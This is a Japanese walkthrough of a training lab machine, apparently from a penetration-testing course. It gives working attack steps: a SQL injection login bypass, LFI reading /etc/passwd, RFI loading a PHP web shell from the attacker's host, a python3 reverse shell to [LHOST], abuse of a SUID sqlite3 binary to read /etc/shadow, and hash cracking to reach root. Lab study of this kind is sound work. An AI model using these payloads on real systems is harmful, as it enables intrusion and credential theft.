machine2で学べることは以下のことです。

- 簡単なSQL injectionを使った認証突破
- LFIとRFI
- suidバイナリによる権限昇格
- おすすめ視聴タイミング: Learning PathのLP-6~LP-7に取り組む前後

### 攻略の流れ
#### Enumeration
nmapを用いてポートスキャンを行います。
```
$ nmap machine2
```
開いていることがわかったポートに対して-sCオプションと-sVオプションをつけてより詳細なスキャンを行います。
```
 $ nmap -p80 -sC -sV machine2
 ```
サービスの調査に移る前に、見落としを避けるためにフルポートスキャンを行います。

今回は-p-オプションを使っています。
```
$ nmap -p- machine2
```
ブラウザでアクセスするとログインページが表示され、簡単なユーザネームとパスワードではログインできません。

SQL Injectionやhydraなどを用いたブルートフォース、gobusterなどを用いたディレクトリの列挙などが考えられますが、今回はSQL Injectionを試みます。
```
' or 1=1 --
```
SQL Injectionを使って認証を突破し、新しいページが表示されました。

urlを確認するとfileというパラメータにaboutme.phpが渡されていることから、aboutme.phpというファイルを読み込んで表示していることが推測されます。

fileというパラメータに/etc/passwdを渡すとファイルが読み込まれて出力されたので、Local File Inclusion(LFI)に脆弱であることがわかりました。

Initial Shell
さらに追加で調査を行うとRFIにも脆弱であることがわかったので、任意のコマンドを実行することが可能になります。

まずphpでOSコマンドを実行できる簡単なスクリプトを作成し、Kali上でpythonを用いてhttpサーバを建てます。
```
&lt;?php system($_GET['cmd']); ?&gt;
```
そして、urlのパラメータでKali上のファイルと実行したいコマンドを指定します。
```
http://machine2/home.php?file=http://[LHOST]:8888/a.php&cmd=whoami
```
任意のコマンドを実行できるようになったのでリバースシェルを取得します。

python3はほとんどのサーバにインストールされており使いやすいため、今回はpython3を利用します。

ncコマンドを用いてリバースシェルを待ち受け、リバースシェルをはるコマンドを実行するとリバースシェルが得られます。
```
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LHOST]",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
#### Enumeration(権限昇格)
シェルを使いやすくするため、シェルのアップグレードを行います。
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
(Ctrl+z)  
$ stty raw -echo;fg  
(Enter)  
(Enter)  
$ export TERM=xterm
```  
権限昇格の列挙では様々なツールを用いることができますが、今回は手動で列挙しています。

以下のコマンドを実行することでfindコマンドを用いてSUIDが設定されているバイナリを列挙することができます。
```
$ find / -perm -4000 2&gt;/dev/null
```
Privilege Escalation
SUIDの設定されたバイナリ一覧を確認するとsqlite3があり、これについて調査するとファイルの内容を読み込めることがわかりました。
```
LFILE=/etc/shadow
sqlite3 &lt;&lt; EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF
```
これによって/etc/shadowを読み込み、rootのパスワードハッシュがわかります。

rootのパスワードハッシュをhashcatやjohn the ripperなどのツールを使って解析するとrootのパスワードがわかるため、suコマンドを用いてrootになることができます。
```
$ hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt   
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
$ su
```